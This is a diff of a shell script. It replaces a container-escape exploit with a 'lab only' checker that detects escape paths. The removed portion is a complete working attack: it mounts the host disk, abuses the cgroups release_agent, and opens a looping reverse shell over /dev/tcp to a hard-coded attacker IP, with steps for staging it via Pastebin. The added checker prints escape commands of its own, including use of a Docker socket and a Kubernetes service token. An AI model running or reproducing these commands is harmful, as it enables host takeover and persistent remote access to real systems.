@@ -1,136 +1,94 @@
-#!/bin/sh
-# ============================================================
-# ATTACKER CONFIGURATION - MODIFY BEFORE USING
-# ============================================================
-ATTACKER_IP="18.215.158.224"  # Replace with your attack machine's IP
-ATTACKER_PORT="4445"          # Replace with your listener port number
-# ============================================================
-# DEPLOYMENT INSTRUCTIONS:
-# 1. Configure the IP and port above
-# 2. Upload this script to Pastebin.com
-# 3. From the target container, download the raw version using:
-#    wget <your-pastebin-raw-url> -O escape.sh
-#    chmod +x escape.sh
-#    sed -i 's/\r$//' escape.sh
-#    ./escape.sh
-# ============================================================
+#!/bin/bash
 
-echo "[*] Container Escape Exploit - Reverse Shell to $ATTACKER_IP:$ATTACKER_PORT"
-echo "[*] This script provides direct shell access to the host"
+echo "==== Container Escape Safety Check (Lab Only) ===="
 
-# Check if running in a privileged container
-echo "[*] Checking for privileged status..."
-if [ ! -f /proc/self/status ]; then
-    echo "[-] Cannot access /proc/self/status. Are you in a container?"
-    exit 1
-fi
+function suggest_exploit() {
+  local reason=$1
+  local command=$2
 
-cap_eff=$(grep CapEff /proc/self/status | awk '{print $2}')
-echo "[*] Container capability set: $cap_eff"
+  echo -e "\n[⚠️  Escape Path Detected: $reason]"
+  echo -e "[💡 Suggested Command for Lab Use Only]"
+  echo -e "    $command"
+}
 
-# More lenient check - this container seems to have high capabilities even if not the exact pattern
-if [ -n "$(echo "$cap_eff" | grep ffffffff)" ]; then
-    echo "[+] Container appears to have high capabilities. Proceeding with exploit..."
-else
-    echo "[-] This container does not appear to have sufficient capabilities."
-    echo "[-] Expected a capability set containing ffffffff"
-    exit 1
-fi
+function check_path() {
+  local path=$1
+  local explanation=$2
+  if [ -e "$path" ]; then
+    echo "[!] Found: $path - $explanation"
+    return 0
+  else
+    echo "[+] Not found: $path - Safe"
+    return 1
+  fi
+}
 
-# Method 1: Mount the host filesystem
-echo "[*] Attempting to access host filesystem via disk device..."
-mkdir -p /tmp/host_root
+function check_docker_socket() {
+  echo "[*] Checking Docker socket..."
+  if [ -S /var/run/docker.sock ]; then
+    echo "[!] Docker socket is mounted inside the container"
+    suggest_exploit "Docker socket exposure" \
+      "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
+  else
+    echo "[+] Docker socket not found - Safe"
+  fi
+}
 
-echo "[*] Attempting to automatically identify a suitable disk device..."
-potential_devices=$(find /dev -name "xvda*" -o -name "sda*" -o -name "vda*" -o -name "nvme*" 2>/dev/null)
+function check_host_proc_access() {
+  if check_path "/proc/1/root" "Can allow access to host filesystem if not namespaced"; then
+    suggest_exploit "/proc/1/root exposed" \
+      "chroot /proc/1/root /bin/sh"
+  fi
+}
 
-if [ -n "$potential_devices" ]; then
-    for device in $potential_devices; do
-        if [ "$(echo "$device" | grep -E '1$|p1$')" ]; then
-            suggested_device="$device"
-            break
-        fi
-    done
-else
-    root_dev=$(df / | tail -1 | awk '{print $1}')
-    if [ "$(echo "$root_dev" | grep '^/dev/')" ]; then
-        suggested_device="$root_dev"
-    fi
-fi
+function check_cap_sys_admin() {
+  echo "[*] Checking capabilities..."
+  if capsh --print | grep -qE "cap_sys_admin|cap_sys_ptrace"; then
+    echo "[!] Container has SYS_ADMIN or PTRACE - Dangerous capabilities available"
+    suggest_exploit "SYS_ADMIN + mounted host path" \
+      "mount -t proc proc /host/proc && chroot /host sh"
+  else
+    echo "[+] SYS_ADMIN and PTRACE not found - Safe"
+  fi
+}
 
-if [ -n "$suggested_device" ]; then
-    disk_device="$suggested_device"
-else
-    echo "[*] Enter the main host disk device to mount (e.g., /dev/xvda1, /dev/sda1):"
-    read disk_device
-fi
+function check_privileged_mode() {
+  echo "[*] Checking for privileged mode..."
+  if grep -q 'CapEff: ffffffff' /proc/self/status; then
+    echo "[!] Container likely running in privileged mode"
+    suggest_exploit "Privileged container" \
+      "mkdir /tmp/host; mount /dev/sda1 /tmp/host && chroot /tmp/host"
+  else
+    echo "[+] Container is not in full privileged mode"
+  fi
+}
 
-if [ -b "$disk_device" ]; then
-    echo "[*] Attempting to mount $disk_device to /tmp/host_root"
-    if mount "$disk_device" /tmp/host_root; then
-        echo "[+] Successfully mounted host filesystem!"
-        echo "[*] Escaping into the host environment..."
-        
-        # Reverse shell payload from the host machine
-        chroot /tmp/host_root /bin/sh -c "
-        (while true; do 
-            /bin/sh -i 2>&1 > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 || true
-            sleep 5;
-        done) &
-        "
-        echo "[+] Reverse shell initiated from the host!"
-    else
-        echo "[-] Failed to mount host filesystem."
-    fi
-fi
+function check_host_mount() {
+  if mount | grep -q '/host'; then
+    echo "[!] Host filesystem appears mounted under /host"
+    suggest_exploit "Host mount detected" \
+      "chroot /host /bin/bash"
+  fi
+}
 
-# Method 2: Using cgroups Release Agent (simplified)
-echo "[*] Attempting cgroups Release Agent method..."
-mkdir -p /tmp/escape
+function check_k8s_token() {
+  if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+    echo "[!] Kubernetes service token found"
+    suggest_exploit "K8s API abuse via service token" \
+      "curl -s --header \"Authorization: Bearer \$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default"
+  else
+    echo "[+] No K8s service account token found"
+  fi
+}
 
-for subsystem in rdma memory cpu devices freezer net_cls; do
-    echo "[*] Trying to mount cgroup with $subsystem subsystem..."
-    if mount -t cgroup -o $subsystem cgroup /tmp/escape 2>/dev/null; then
-        echo "[+] Successfully mounted cgroup filesystem using $subsystem subsystem"
-        break
-    fi
-done
+echo ""
+check_path "/dev/mem" "Can lead to host memory read/write if privileged"
+check_host_proc_access
+check_host_mount
+check_cap_sys_admin
+check_privileged_mode
+check_docker_socket
+check_k8s_token
 
-if ! mountpoint -q /tmp/escape; then
-    echo "[*] Trying to mount cgroup without specifying a subsystem..."
-    mount -t cgroup cgroup /tmp/escape 2>/dev/null
-fi
-
-if ! mountpoint -q /tmp/escape; then
-    echo "[-] Could not mount cgroup filesystem. Failed to escape."
-    exit 1
-fi
-
-if [ -f /tmp/escape/release_agent ]; then
-    work_dir="/tmp/escape"
-else
-    mkdir -p /tmp/escape/x
-    work_dir="/tmp/escape/x"
-fi
-
-echo 1 > "$work_dir/notify_on_release"
-host_path="/tmp/escape/release_agent"
-
-cat > /tmp/payload.sh << EOF
-#!/bin/sh
-while true; do
-    /bin/sh -i 2>&1 > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 || true
-    sleep 5
-done
-EOF
-
-chmod +x /tmp/payload.sh
-echo "/tmp/payload.sh" > "$host_path"
-chmod +x "$host_path"
-
-echo "[*] Triggering exploit..."
-echo $$ > "$work_dir/cgroup.procs" 2>/dev/null || echo $$ > "$work_dir/tasks" 2>/dev/null
-
-echo "[*] Waiting for shell..."
-sleep 3
-echo "[+] Reverse shell initiated! Check your Netcat listener on $ATTACKER_IP:$ATTACKER_PORT."
+echo ""
+echo "==== Check Complete. Use responsibly in lab environments only. ===="
